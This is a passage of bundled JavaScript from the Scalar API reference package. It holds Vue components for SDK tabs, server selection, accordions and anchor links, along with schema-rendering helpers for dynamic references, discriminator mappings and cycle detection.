		/** The width available to render the tabs in */
		const availableWidth = ref(0);
		/** The natural width of each tab */
		const tabWidths = ref([]);
		/** The width of the "More" dropdown trigger */
		const moreWidth = ref(0);
		/** Measure the available width and the natural width of each tab */
		const measure = () => {
			const measureEl = measureRef.value;
			const rowEl = rowRef.value;
			if (!measureEl || !rowEl) return;
			const widths = Array.from(measureEl.children).map((child) => child.offsetWidth);
			tabWidths.value = widths.slice(0, sdks.value.length);
			moreWidth.value = widths[sdks.value.length] ?? 0;
			availableWidth.value = rowEl.clientWidth;
		};
		/** How many tabs fit inline before we need the "More" dropdown */
		const visibleCount = computed(() => {
			if (!tabWidths.value.length || availableWidth.value <= 0) return sdks.value.length;
			return getVisibleTabCount(tabWidths.value, availableWidth.value, moreWidth.value);
		});
		/** The SDKs shown as inline tabs */
		const visibleSdks = computed(() => sdks.value.slice(0, visibleCount.value));
		/** Whether the selected SDK lives in the "More" dropdown */
		const isMoreActive = computed(() => selectedIndex.value >= visibleCount.value);
		/** The overflowing SDKs as combobox options, keyed by their original index */
		const moreOptions = computed(() => sdks.value.slice(visibleCount.value).map((sdk, index) => ({
			id: String(visibleCount.value + index),
			label: sdk.lang
		})));
		/** The selected option within the "More" dropdown, if any */
		const selectedMoreOption = computed(() => moreOptions.value.find((option) => option.id === String(selectedIndex.value)));
		const selectMore = (option) => {
			if (option) select(Number(option.id));
		};
		/** The id of the tab that labels the panel (falls back to the heading when the selection lives in "More") */
		const activeTabId = computed(() => isMoreActive.value ? headingId : `${baseId}-tab-${selectedIndex.value}`);
		/**
		* The visible tab that holds the roving tabindex. When the selection lives in
		* the "More" dropdown, that trigger is the tab stop instead, so no inline tab
		* should be focusable.
		*/
		const tabStopIndex = computed(() => isMoreActive.value ? -1 : selectedIndex.value);
		/** Focus a visible tab by index after the DOM has settled */
		const focusTab = (index) => {
			nextTick(() => {
				tabsRef.value?.querySelectorAll("[role=\"tab\"]").item(index)?.focus();
			});
		};
		/** Arrow / Home / End keyboard navigation across the visible tabs (WAI-ARIA tabs pattern) */
		const onTabKeydown = (event, index) => {
			const lastVisible = visibleCount.value - 1;
			let next = index;
			switch (event.key) {
				case "ArrowRight":
				case "ArrowDown":
					next = index >= lastVisible ? 0 : index + 1;
					break;
				case "ArrowLeft":
				case "ArrowUp":
					next = index <= 0 ? lastVisible : index - 1;
					break;
				case "Home":
					next = 0;
					break;
				case "End":
					next = lastVisible;
					break;
				default: return;
			}
			event.preventDefault();
			select(next);
			focusTab(next);
		};
		let observer;
		let frame = 0;
		/** Coalesce resize bursts into a single measure before the next paint */
		const scheduleMeasure = () => {
			if (typeof requestAnimationFrame === "undefined") {
				measure();
				return;
			}
			cancelAnimationFrame(frame);
			frame = requestAnimationFrame(measure);
		};
		onMounted(() => {
			if (typeof ResizeObserver !== "undefined") {
				observer = new ResizeObserver(scheduleMeasure);
				if (rowRef.value) observer.observe(rowRef.value);
				if (measureRef.value) observer.observe(measureRef.value);
			}
			measure();
		});
		onBeforeUnmount(() => {
			observer?.disconnect();
			if (typeof cancelAnimationFrame !== "undefined") cancelAnimationFrame(frame);
		});
		return (_ctx, _cache) => {
			return sdks.value.length ? (openBlock(), createElementBlock("div", _hoisted_1$76, [
				createBaseVNode("div", {
					id: unref(headingId),
					class: "client-libraries-heading"
				}, toDisplayString(unref(translate)("clientLibraries.heading")), 9, _hoisted_2$49),
				createBaseVNode("div", _hoisted_3$34, [createBaseVNode("div", {
					ref_key: "rowRef",
					ref: rowRef,
					class: "client-libraries-row"
				}, [createBaseVNode("div", {
					ref_key: "tabsRef",
					ref: tabsRef,
					"aria-labelledby": unref(headingId),
					class: "client-libraries-tabs",
					role: "tablist"
				}, [(openBlock(true), createElementBlock(Fragment, null, renderList(visibleSdks.value, (sdk, index) => {
					return openBlock(), createElementBlock("button", {
						id: `${unref(baseId)}-tab-${index}`,
						key: index,
						"aria-controls": panelId,
						"aria-selected": index === selectedIndex.value,
						class: normalizeClass(["client-libraries", { "client-libraries__active": index === selectedIndex.value }]),
						role: "tab",
						tabindex: index === tabStopIndex.value ? 0 : -1,
						type: "button",
						onClick: ($event) => select(index),
						onKeydown: ($event) => onTabKeydown($event, index)
					}, [sdk.icon ? (openBlock(), createBlock(unref(ScalarIcon_default), {
						key: 0,
						class: "client-libraries-icon",
						icon: sdk.icon
					}, null, 8, ["icon"])) : createCommentVNode("", true), createBaseVNode("span", _hoisted_6$13, toDisplayString(sdk.lang), 1)], 42, _hoisted_5$15);
				}), 128))], 8, _hoisted_4$21), visibleCount.value < sdks.value.length ? (openBlock(), createBlock(unref(ScalarCombobox_default), {
					key: 0,
					modelValue: selectedMoreOption.value,
					options: moreOptions.value,
					placement: "bottom-end",
					teleport: "",
					"onUpdate:modelValue": selectMore
				}, {
					default: withCtx(() => [createBaseVNode("button", {
						class: normalizeClass(["client-libraries client-libraries-more", { "client-libraries__active": isMoreActive.value }]),
						type: "button"
					}, [createVNode(unref(ScalarIcon_default), {
						class: "client-libraries-icon",
						icon: isMoreActive.value && selected.value?.icon ? selected.value.icon : "Ellipses"
					}, null, 8, ["icon"]), createBaseVNode("span", _hoisted_7$8, toDisplayString(unref(translate)("clientLibraries.more")), 1)], 2)]),
					_: 1
				}, 8, ["modelValue", "options"])) : createCommentVNode("", true)], 512), createBaseVNode("div", _hoisted_8$7, [createBaseVNode("div", {
					ref_key: "measureRef",
					ref: measureRef,
					class: "client-libraries-row client-libraries-row--measure"
				}, [(openBlock(true), createElementBlock(Fragment, null, renderList(sdks.value, (sdk, index) => {
					return openBlock(), createElementBlock("span", {
						key: index,
						class: "client-libraries"
					}, [sdk.icon ? (openBlock(), createBlock(unref(ScalarIcon_default), {
						key: 0,
						class: "client-libraries-icon",
						icon: sdk.icon
					}, null, 8, ["icon"])) : createCommentVNode("", true), createBaseVNode("span", _hoisted_9$6, toDisplayString(sdk.lang), 1)]);
				}), 128)), createBaseVNode("span", _hoisted_10$3, [createVNode(unref(ScalarIcon_default), {
					class: "client-libraries-icon",
					icon: "Ellipses"
				}), createBaseVNode("span", _hoisted_11$2, toDisplayString(unref(translate)("clientLibraries.more")), 1)])], 512)])]),
				selected.value?.description ? (openBlock(), createElementBlock("div", {
					key: 0,
					id: panelId,
					"aria-labelledby": activeTabId.value,
					class: "selected-client",
					role: "tabpanel",
					tabindex: "0"
				}, [createVNode(unref(ScalarMarkdown_default), { value: selected.value.description }, null, 8, ["value"])], 8, _hoisted_12$2)) : createCommentVNode("", true)
			])) : createCommentVNode("", true);
		};
	}
}), [["__scopeId", "data-v-e8d27a01"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-server-selector-block/components/Selector.vue.script.js
var _hoisted_1$75 = { class: "sr-only" };
var _hoisted_2$48 = { class: "overflow-x-auto" };
var _hoisted_3$33 = {
	key: 1,
	class: "text-c-1 flex h-auto w-full items-center gap-0.75 !rounded-b-xl px-3 py-1.5 text-base leading-[20px] whitespace-nowrap"
};
var _hoisted_4$20 = { class: "sr-only" };
var _hoisted_5$14 = { class: "overflow-x-auto" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-server-selector-block/components/Selector.vue.js
var Selector_default = /* @__PURE__ */ defineComponent({
	__name: "Selector",
	props: {
		selectedServer: {},
		servers: {},
		target: {}
	},
	emits: ["update:modelValue"],
	setup(__props, { expose: __expose, emit: __emit }) {
		const emit = __emit;
		const { translate } = useLocalization();
		const serverOptions = computed(() => __props.servers.map((server) => ({
			id: server.url,
			label: server.name || server.url
		})));
		const serverUrlWithoutTrailingSlash = computed(() => __props.selectedServer?.url?.replace(/\/$/, "") || "");
		const selectedServerOption = computed(() => serverOptions.value.find((opt) => opt.id === __props.selectedServer?.url));
		__expose({
			servers: __props.servers,
			serverUrlWithoutTrailingSlash,
			serverOptions,
			selectedServer: __props.selectedServer
		});
		return (_ctx, _cache) => {
			return serverOptions.value.length > 1 ? (openBlock(), createBlock(unref(ScalarListbox_default), {
				key: 0,
				ref: "elem",
				class: "group",
				modelValue: selectedServerOption.value,
				options: serverOptions.value,
				placement: "bottom-start",
				resize: "",
				target: __props.target,
				"onUpdate:modelValue": _cache[0] || (_cache[0] = (e) => emit("update:modelValue", e.id))
			}, {
				default: withCtx(() => [createVNode(unref(ScalarButton_default), {
					class: "bg-b-1 text-c-1 h-auto w-full justify-start gap-1.5 overflow-x-auto rounded-t-none !rounded-b-xl px-3 py-1.5 text-base/5.25 font-normal whitespace-nowrap -outline-offset-1",
					variant: "ghost"
				}, {
					default: withCtx(() => [
						createBaseVNode("span", _hoisted_1$75, toDisplayString(unref(translate)("server.label")) + ":", 1),
						createBaseVNode("span", _hoisted_2$48, toDisplayString(serverUrlWithoutTrailingSlash.value || unref(translate)("server.select")), 1),
						createVNode(unref(ScalarIconCaretDown_default), {
							class: "text-c-2 ui-open:rotate-180 mt-0.25 size-3 transition-transform duration-100",
							weight: "bold"
						})
					]),
					_: 1
				})]),
				_: 1
			}, 8, [
				"modelValue",
				"options",
				"target"
			])) : (openBlock(), createElementBlock("div", _hoisted_3$33, [createBaseVNode("span", _hoisted_4$20, toDisplayString(unref(translate)("server.label")) + ":", 1), createBaseVNode("span", _hoisted_5$14, toDisplayString(serverUrlWithoutTrailingSlash.value), 1)]));
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-server-selector-block/components/ServerSelector.vue.script.js
var _hoisted_1$74 = { class: "bg-b-2 flex h-8 items-center rounded-t-xl border-x border-t px-3 py-2.5 font-medium" };
var _hoisted_2$47 = ["id"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-server-selector-block/components/ServerSelector.vue.js
var ServerSelector_default = /* @__PURE__ */ defineComponent({
	__name: "ServerSelector",
	props: {
		eventBus: {},
		selectedServer: {},
		servers: {}
	},
	setup(__props) {
		const id = useId();
		const { translate } = useLocalization();
		/** Update the selected server */
		const updateServer = (newServer) => {
			__props.eventBus.emit("server:update:selected", {
				url: __props.selectedServer?.url === newServer ? "" : newServer,
				meta: { type: "document" }
			});
		};
		/** Update the server variable */
		const updateServerVariable = (key, value) => {
			/** Find the index of the selected server */
			const index = __props.servers.findIndex((s) => s.url === __props.selectedServer?.url);
			if (index === -1) return;
			__props.eventBus.emit("server:update:variables", {
				index,
				key,
				value,
				meta: { type: "document" }
			});
		};
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock(Fragment, null, [
				createBaseVNode("label", _hoisted_1$74, toDisplayString(unref(translate)("server.label")), 1),
				createBaseVNode("div", {
					id: unref(id),
					class: normalizeClass(["border", { "rounded-b-xl": !__props.selectedServer?.description && !__props.selectedServer?.variables }])
				}, [__props.servers.length ? (openBlock(), createBlock(Selector_default, {
					key: 0,
					selectedServer: __props.selectedServer,
					servers: __props.servers,
					target: unref(id),
					"onUpdate:modelValue": updateServer
				}, null, 8, [
					"selectedServer",
					"servers",
					"target"
				])) : createCommentVNode("", true)], 10, _hoisted_2$47),
				createVNode(unref(ServerVariablesForm_default), {
					layout: "reference",
					variables: __props.selectedServer?.variables,
					"onUpdate:variable": updateServerVariable
				}, null, 8, ["variables"]),
				__props.selectedServer?.description ? (openBlock(), createBlock(unref(ScalarMarkdown_default), {
					key: 0,
					class: "text-c-3 rounded-b-xl border-x border-b px-3 py-1.5",
					value: __props.selectedServer.description
				}, null, 8, ["value"])) : createCommentVNode("", true)
			], 64);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/SectionAccordion.vue.script.js
var _hoisted_1$73 = ["id"];
var _hoisted_2$46 = {
	key: 0,
	class: "section-accordion-button-actions pointer-events-none relative"
};
var _hoisted_3$32 = {
	key: 0,
	class: "section-accordion-description"
};
var _hoisted_4$19 = { class: "section-accordion-content-card" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Section/SectionAccordion.vue.js
var SectionAccordion_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SectionAccordion",
	props: {
		transparent: { type: Boolean },
		modelValue: { type: Boolean }
	},
	emits: ["update:modelValue"],
	setup(__props, { emit: __emit }) {
		const emit = __emit;
		const header = ref();
		const isHovered = useElementHover(header);
		/** Names the toggle after the title, which renders beside the button rather than inside it. */
		const titleId = useId();
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(N$2), {
				as: "section",
				class: normalizeClass(["section-accordion", { "section-accordion-transparent": __props.transparent }])
			}, {
				default: withCtx(() => [createBaseVNode("div", {
					ref_key: "header",
					ref: header,
					class: "section-accordion-header group/heading"
				}, [
					createVNode(unref(Q), {
						"aria-labelledby": unref(titleId),
						class: "section-accordion-button absolute inset-0 cursor-pointer border-none bg-transparent p-0",
						onClick: _cache[0] || (_cache[0] = () => emit("update:modelValue", !__props.modelValue))
					}, null, 8, ["aria-labelledby"]),
					createBaseVNode("div", {
						id: unref(titleId),
						class: "section-accordion-button-content pointer-events-none relative"
					}, [renderSlot(_ctx.$slots, "title", {}, void 0, true)], 8, _hoisted_1$73),
					_ctx.$slots.actions ? (openBlock(), createElementBlock("div", _hoisted_2$46, [renderSlot(_ctx.$slots, "actions", { active: unref(isHovered) || __props.modelValue }, void 0, true)])) : createCommentVNode("", true),
					createVNode(unref(ScalarIconCaretRight_default), { class: normalizeClass(["section-accordion-chevron pointer-events-none size-4.5 transition-transform", { "rotate-90": __props.modelValue }]) }, null, 8, ["class"])
				], 512), __props.modelValue ? (openBlock(), createBlock(unref(V), {
					key: 0,
					class: "section-accordion-content",
					static: ""
				}, {
					default: withCtx(() => [_ctx.$slots.description ? (openBlock(), createElementBlock("div", _hoisted_3$32, [renderSlot(_ctx.$slots, "description", {}, void 0, true)])) : createCommentVNode("", true), createBaseVNode("div", _hoisted_4$19, [renderSlot(_ctx.$slots, "default", {}, void 0, true)])]),
					_: 3
				})) : createCommentVNode("", true)]),
				_: 3
			}, 8, ["class"]);
		};
	}
}), [["__scopeId", "data-v-08b79926"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/ScreenReader.vue.script.js
var _hoisted_1$72 = {
	key: 0,
	class: "screenreader-only"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/ScreenReader.vue.js
var ScreenReader_default = /* @__PURE__ */ defineComponent({
	__name: "ScreenReader",
	props: { if: {
		type: Boolean,
		default: true
	} },
	setup(__props) {
		return (_ctx, _cache) => {
			return _ctx.$props.if ? (openBlock(), createElementBlock("span", _hoisted_1$72, [renderSlot(_ctx.$slots, "default")])) : renderSlot(_ctx.$slots, "default", {}, void 0, void 0, 1);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Anchor/Anchor.vue.script.js
var _hoisted_1$71 = ["id"];
var _hoisted_2$45 = { class: "relative" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Anchor/Anchor.vue.js
var Anchor_default = /* @__PURE__ */ defineComponent({
	__name: "Anchor",
	emits: ["copyAnchorUrl"],
	setup(__props, { emit: __emit }) {
		const emit = __emit;
		const labelId = useId();
		const { translate } = useLocalization();
		const { cx } = useBindCx();
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("span", normalizeProps$1(guardReactiveProps(unref(cx)("group/heading wrap-break-word relative"))), [createBaseVNode("span", {
				id: unref(labelId),
				class: "contents"
			}, [renderSlot(_ctx.$slots, "default")], 8, _hoisted_1$71), createBaseVNode("span", _hoisted_2$45, [_cache[1] || (_cache[1] = createBaseVNode("span", null, "​", -1)), createVNode(unref(ScalarButton_default), {
				"aria-describedby": unref(labelId),
				class: "absolute top-1/2 left-0 inline-block h-fit -translate-y-1/2 px-1.5 py-1 opacity-0 group-hover/heading:opacity-100 group-has-focus-visible/heading:opacity-100",
				variant: "ghost",
				onClick: _cache[0] || (_cache[0] = withModifiers(() => emit("copyAnchorUrl"), ["stop"]))
			}, {
				default: withCtx(() => [createVNode(unref(ScalarIconHash_default), {
					"aria-hidden": "true",
					class: "size-4.5"
				}), createVNode(ScreenReader_default, null, {
					default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("actions.copyLink")), 1)]),
					_: 1
				})]),
				_: 1
			}, 8, ["aria-describedby"])])], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Anchor/CopyLinkButton.vue.script.js
var _hoisted_1$70 = { class: "sr-only" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Anchor/CopyLinkButton.vue.js
var CopyLinkButton_default = /* @__PURE__ */ defineComponent({
	__name: "CopyLinkButton",
	props: {
		anchorId: {},
		eventBus: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		/** Screen-reader label for the copy-link button, naming the deep-linked item. */
		const copyLinkLabel = computed(() => translate("actions.copyLinkTo", { name: __props.anchorId.split(".").pop() ?? "" }));
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("button", {
				class: "copy-link-trailing text-c-3 hover:text-c-1 -my-1 ms-1.5 -me-1 flex shrink-0 cursor-pointer items-center justify-center self-center p-1 opacity-0 group-hover:opacity-100 focus-visible:opacity-100 pointer-coarse:hidden",
				type: "button",
				onClick: _cache[0] || (_cache[0] = () => __props.eventBus?.emit("copy-url:nav-item", { id: __props.anchorId }))
			}, [createVNode(unref(ScalarIconHash_default), {
				"aria-hidden": "true",
				class: "size-3.5"
			}), createBaseVNode("span", _hoisted_1$70, [renderSlot(_ctx.$slots, "sr-label", {}, () => [createTextVNode(toDisplayString(copyLinkLabel.value), 1)])])]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Anchor/WithBreadcrumb.vue.script.js
var _hoisted_1$69 = ["id"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Anchor/WithBreadcrumb.vue.js
var WithBreadcrumb_default = /* @__PURE__ */ defineComponent({
	__name: "WithBreadcrumb",
	props: { breadcrumb: {} },
	setup(__props) {
		return (_ctx, _cache) => {
			return __props.breadcrumb && __props.breadcrumb.length > 0 ? (openBlock(), createElementBlock("div", {
				key: 0,
				id: __props.breadcrumb.join("."),
				class: "static scroll-mt-24",
				tabindex: "-1"
			}, [renderSlot(_ctx.$slots, "default")], 8, _hoisted_1$69)) : renderSlot(_ctx.$slots, "default", {}, void 0, void 0, 1);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/dynamic-scope.js
/**
* The dynamic scope — the outermost-first chain of schema resources on the current render path.
*
* JSON Schema 2020-12 `$dynamicRef` does not resolve to a fixed location. It binds to the active
* `$dynamicAnchor` in the chain of resources entered to reach it, so the same
* `{ "$dynamicRef": "#itemType" }` inside a shared generic template resolves to a different concrete
* type depending on the path taken (e.g. `User` via a user page, `Group` via a group page).
*
* Each object `Schema` node injects this scope, appends its own resource, and re-provides it to its
* descendants. `SchemaProperty` reads it to bind a `$dynamicRef` property or array item to the
* concrete schema while walking the tree. See https://github.com/scalar/scalar/issues/9414.
*/
var SCHEMA_DYNAMIC_SCOPE_SYMBOL = Symbol("schema-dynamic-scope");
/** Shared empty scope used as the inject default at the root, where nothing has been entered yet. */
var EMPTY_SCOPE = [];
/** Read the dynamic scope provided by ancestor schema nodes (empty at the root of the tree). */
var useDynamicScope = () => inject(SCHEMA_DYNAMIC_SCOPE_SYMBOL, EMPTY_SCOPE);
/**
* Resolve a schema that may be a `$dynamicRef` against the active dynamic scope.
*
* Returns the bound concrete schema when the reference matches a `$dynamicAnchor` in scope. When
* nothing matches (or the schema is not a `$dynamicRef`) the input is returned unchanged, so
* rendering falls back to its prior behavior with no regression.
*/
var resolveDynamicSchema = (schema, scope) => {
	if (isDynamicRef(schema)) return resolveDynamicRef(schema.$dynamicRef, scope) ?? schema;
	return schema;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/get-ref-name.js
/**
* Gets the final reference segment for display, including external references.
* Use getSchemaRefName when the name must link to a local model.
*
* @example SchemaName from #/components/schemas/SchemaName
*/
var getRefName = (ref) => {
	if (!ref) return null;
	const match = ref.match(REGEX.REF_NAME);
	if (match) return match[1];
	return null;
};
/**
* Matches a local reference that points at `#/components/schemas/<name>` and
* captures the schema name. Intentionally strict: only refs that resolve to a
* navigable model in `components.schemas` should be linkable.
*/
var COMPONENTS_SCHEMAS_REF = /^#\/components\/schemas\/([^/]+)$/;
/**
* Gets the models-section key for a `$ref`, but only when the ref actually
* targets `#/components/schemas/`.
*
* The models index used for navigation is built exclusively from
* `components.schemas`, so a ref into any other bucket (`parameters`,
* `responses`, ...) or an external file (`./other.yaml#/Foo`) has no navigable
* target. Returning `null` for those keeps the name visible as plain text while
* avoiding a dead link.
*
* @example
* getSchemaRefName('#/components/schemas/Planet') // 'Planet'
* getSchemaRefName('#/components/parameters/Planet') // null
* getSchemaRefName('./planets.yaml#/Planet') // null
*/
var getSchemaRefName = (ref) => {
	if (!ref) return null;
	const match = ref.match(COMPONENTS_SCHEMAS_REF);
	if (match?.[1]) return decodeURIComponent(match[1]);
	return null;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/has-complex-array-items.js
/** Composition keywords that indicate complex schema structure */
var COMPOSITION_KEYWORDS = [
	"allOf",
	"oneOf",
	"anyOf"
];
/**
* Checks if a schema has object type (either explicit type: 'object' or has properties)
*/
var isObjectType = (schema) => {
	if ("type" in schema && schema.type) {
		if (Array.isArray(schema.type)) return schema.type.includes("object");
		return schema.type === "object";
	}
	return "properties" in schema;
};
/**
* Checks if a schema has complex features (refs, compositions, discriminators)
*/
var hasComplexFeatures = (schema) => "$ref" in schema || "discriminator" in schema || COMPOSITION_KEYWORDS.some((keyword) => keyword in schema);
/**
* Checks if nested array items are complex
*/
var hasComplexNestedArrayItems = (items) => {
	if (!isArraySchema(items) || typeof items.items !== "object") return false;
	if ("$ref" in items.items) return true;
	const nestedItems = getResolvedRef(items.items);
	if (!nestedItems) return false;
	return isObjectType(nestedItems) || hasComplexFeatures(nestedItems) || isArraySchema(nestedItems);
};
/**
* Checks if array items have complex structure
* like: objects, references, discriminators, compositions, or nested arrays with complex items
*
* @param value - The schema object to check
* @returns true if the array has complex items, false otherwise
*/
var hasComplexArrayItems = (value) => {
	if (!value || !isArraySchema(value) || typeof value.items !== "object") return false;
	if ("$ref" in value.items) return true;
	const items = getResolvedRef(value.items);
	if (!items) return false;
	if (hasComplexFeatures(items)) return true;
	if (isObjectType(items)) return true;
	return hasComplexNestedArrayItems(items);
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/unwrap-for-read.js
/**
* Peel the two write-oriented layers off a workspace value so the schema tree reads it
* through the magic and overrides proxies only.
*
* In the app a document sits under four proxies: Vue's `reactive` wraps a detect-changes
* proxy (see `createWorkspaceStore`), which wraps `createOverridesProxy(createMagicProxy(raw))`.
* Rendering a schema is read-only, but every property access still pays for all four: the
* reactive layer tracks a dependency and lazily wraps the child, and the detect-changes `get`
* allocates a fresh `{ ...args, path: [...args.path, prop] }` for every object-valued read.
* Together they make a nested read roughly sixteen times more expensive than the same read
* through the magic layer alone.
*
* Only the outer two layers are removed. The magic layer must stay, because every resolver in
* this directory reads the virtual `$ref-value` property it synthesises, and the overrides
* layer must stay so `x-scalar-*` overrides keep resolving. That rules out the store's own
* `getRaw` / `unpackProxyObject` helpers (they strip the magic layer, and `unpackProxyObject`
* writes unpacked children back onto the raw document) as well as `markRaw` (it would write
* `__v_skip` through the detect-changes set hooks).
*
* What this gives up is Vue dependency tracking on reads *inside* a schema subtree. That is
* safe here because the API reference never mutates a schema node in place: documents are
* added or replaced whole and switched by name, so a `Schema` root always receives a new
* object and re-renders from the prop identity, and the in-place writes that do exist
* (`x-scalar-active-document`, `x-scalar-is-dirty`) are document-level keys no schema
* component reads.
*
* That invariant is the precondition, so here is what would break it. Anything that fills an
* existing schema node in place, rather than handing the tree a new object, becomes invisible
* to every component below a `Schema` root and the stale subtree stays on screen:
*
* - `store.resolve(path)` in `@scalar/workspace-store` (see `client.ts`) bundles lazily and
*   populates the node already at `path`. The API reference does not call it today. Wiring up
*   lazy `$ref` bundling means this unwrap has to go, or the resolved subtree has to arrive as
*   a new object the `Schema` prop can be swapped to.
* - `merge-all-of-schemas.ts` reaches one in-place write of its own: when a merged `items` was
*   itself taken from the document (`result.items = items`), a later pass `Object.assign`s onto
*   that document node. It is idempotent and runs while the same render is still computing, so
*   nothing re-reads it afterwards, but it is the shape to watch for.
*
* There is deliberately no runtime guard. Catching these writes would mean proxying the whole
* subtree again — the exact per-read cost this removes — and the writes above happen on nodes
* reached through `resolve.schema`, not through the value returned here, so a shallow proxy on
* the root would catch none of them.
*
* Idempotent: a plain object (unit tests, stories, static documents) is returned unchanged.
*/
var unwrapForRead = (value) => unpackDetectChangesProxy(toRaw(value));
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/schema-composition.js
var compositions = [
	"oneOf",
	"anyOf",
	"allOf",
	"not"
];
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/should-render-array-item-composition.js
/**
* Check if array item composition should be rendered
*
* @param schema - The schema object to check
* @param composition - The composition keyword to check for
* @returns true if array item composition should be rendered, false otherwise
*/
var shouldRenderArrayItemComposition = (schema, composition) => {
	if (!schema || !isArraySchema(schema)) return false;
	const items = schema.items;
	if (!items || typeof items !== "object" || !(composition in items)) return false;
	return !hasComplexArrayItems(schema);
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/get-compositions-to-render.js
var normalizeDiscriminatorMappingRef = (value) => value.startsWith("#/") || value.includes("/") ? value : `#/components/schemas/${value}`;
/**
* Builds a synthetic `oneOf` composition from a `discriminator.mapping` when the
* schema declares a mapping but no explicit `oneOf`/`anyOf`. This is the shape
* NSwag emits for polymorphic types, where the base type is a plain object with
* a discriminator mapping pointing at the concrete variants.
*
* Returns `null` when there is nothing to infer (an explicit composition is
* already present, no document to resolve refs against, or no resolvable refs).
*/
var inferDiscriminatorMappingComposition = (value, documentProp) => {
	if (value.oneOf || value.anyOf) return null;
	const mapping = value.discriminator?.mapping;
	if (!mapping) return null;
	const document = unwrapForRead(documentProp);
	if (!document?.components?.schemas) return null;
	const refs = Object.values(mapping).filter((mappingValue) => typeof mappingValue === "string").map((mappingValue) => {
		const ref = normalizeDiscriminatorMappingRef(mappingValue);
		const refName = getRefName(ref);
		const refValue = refName ? resolve.schema(document.components?.schemas?.[refName]) : void 0;
		if (!refValue) return;
		return {
			$ref: ref,
			"$ref-value": refValue
		};
	}).filter(isDefined);
	if (refs.length === 0) return null;
	return {
		...resolve.schema(value),
		oneOf: refs
	};
};
/**
* Computes which compositions should be rendered and with which values
*
* @param value - The schema object to check for compositions
* @returns Array of compositions to render with their values
*/
var getCompositionsToRender = (value, document, inferredDiscriminatorComposition = value ? inferDiscriminatorMappingComposition(value, document) : null) => {
	if (!value) return [];
	return compositions.map((composition) => {
		if (composition === "oneOf" && inferredDiscriminatorComposition) return {
			composition,
			value: inferredDiscriminatorComposition
		};
		if (shouldRenderArrayItemComposition(value, composition) && isArraySchema(value) && value.items) return {
			composition,
			value: resolve.schema(value.items)
		};
		if (value[composition]) {
			if (!(isArraySchema(value) && value.items && typeof value.items === "object" && composition in value.items)) return {
				composition,
				value: resolve.schema(value)
			};
		}
		return null;
	}).filter(isDefined);
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/is-type-object.js
var isTypeObject = (schema) => {
	if (schema === null || typeof schema !== "object" || Array.isArray(schema)) return false;
	if ("oneOf" in schema || "anyOf" in schema || "allOf" in schema || "not" in schema) return false;
	const hasType = "type" in schema;
	if (hasType && Array.isArray(schema.type)) return schema.type.includes("object");
	const hasTypeObject = hasType && schema.type === "object";
	if (hasTypeObject) return true;
	if (hasType && !hasTypeObject) return false;
	const hasProperties = "properties" in schema;
	const hasAdditionalProperties = "additionalProperties" in schema;
	const hasPatternProperties = "patternProperties" in schema;
	return hasProperties || hasAdditionalProperties || hasPatternProperties;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/schema-cycle.js
/**
* The set of schema "cycle keys" for every ancestor on the current render path.
*
* Each `Schema` component injects this set, adds its own key, and re-provides
* it to its descendants. When a node's key is already present in the ancestor
* set we've hit a cycle (a self-referential schema) and must stop force
* expanding to avoid rendering forever.
*
* See {@link getCycleKey} for how a node's key is derived.
*/
var SCHEMA_ANCESTORS_SYMBOL = Symbol("schema-ancestors");
/**
* Derive a stable identity for a schema node from its *raw* (unresolved) value.
*
* Cycle detection needs a key that is identical every time the same schema is
* reached along a path, and that survives the shallow copies/merges performed
* while rendering (which break object identity of the resolved schema).
*
* - For `$ref` nodes we use the ref string. Two branches that reference the
*   same component share the string, so a schema that (transitively) references
*   itself is detected as a cycle, while sibling references are not.
* - For inline schemas there is no ref, so we fall back to the raw object
*   reference. A self-referential inline schema reuses the same object, so
*   object identity catches the cycle.
*
* Returns `undefined` for primitives/booleans (e.g. `additionalProperties: true`)
* which can never form a cycle.
*/
var getCycleKey = (raw) => {
	if (raw && typeof raw === "object") {
		if ("$ref" in raw && typeof raw.$ref === "string") return raw.$ref;
		return raw;
	}
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaRailPanel.vue.js
var SchemaRailPanel_default = /* @__PURE__ */ defineComponent({
	__name: "SchemaRailPanel",
	props: {
		depth: {},
		closeOnRail: {
			type: Boolean,
			default: false
		},
		as: { default: "div" }
	},
	emits: ["close"],
	setup(__props, { emit: __emit }) {
		const emit = __emit;
		/**
		* A hovered strip colours this panel's rail and lights the puck of the control
		* that owns the panel. Both used to be `:has(... :hover)` selectors, which made
		* every railed row a `:has()` invalidation anchor, so each element inserted
		* under an open row restyled its whole subtree. The strip's pointer events now
